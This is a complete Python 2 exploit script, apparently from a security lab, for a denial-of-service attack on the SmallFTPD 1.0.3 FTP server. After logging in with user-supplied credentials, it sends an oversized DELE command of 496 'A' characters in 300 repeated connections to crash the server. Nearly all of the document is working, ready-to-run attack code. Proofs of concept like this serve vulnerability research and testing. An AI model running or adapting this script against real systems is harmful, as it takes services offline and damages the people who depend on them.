# Tested on: Windows XP, SP2 (EN)
#!/usr/bin/python
print "\n#################################################################"
print "##                      RedTeam Security                       ##"
print "##           SmallFTPD FTP Server DELE Command DoS             ##"
print "##                        Version 1.0.3                        ##"
print "##                                                             ##"
print "##                     Jeremiah Talamantes                     ##"
print "##                   labs@redteamsecure.com                    ##"
print "################################################################# \n"

import socket
import sys

# Define the exploit's usage
def Usage():
    print ("Usage: scriptname.py <IP> <username> <password>\n")
    print ("\n\nCredit: Jeremiah Talamantes")
    print ("RedTeam Security : www.redteamsecure.com/labs\n")

# Buffer
buffer="A" * 496

def exploit(hostname,username,password):
	i=0
	while i < 300:
		i=i+1
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			sock.connect((hostname, 21))
		except:
			print ("Error: unable to connect to host")
			sys.exit(1)
		r=sock.recv(1024)
		print "[+] " + r + ": running iteration number:  ",i
		sock.send("USER " + username + "\r\n")
		r=sock.recv(1024)
		sock.send("PASS " + password + "\r\n")
		r=sock.recv(1024)
		sock.send("DELE " + buffer + "\r\n")
		sock.close()
		
if len(sys.argv) <> 4:
    Usage()
    sys.exit(1)
else:
	hostname=sys.argv[1]
	username=sys.argv[2]
	password=sys.argv[3]
	exploit(hostname,username,password)
	sys.exit(0)

# End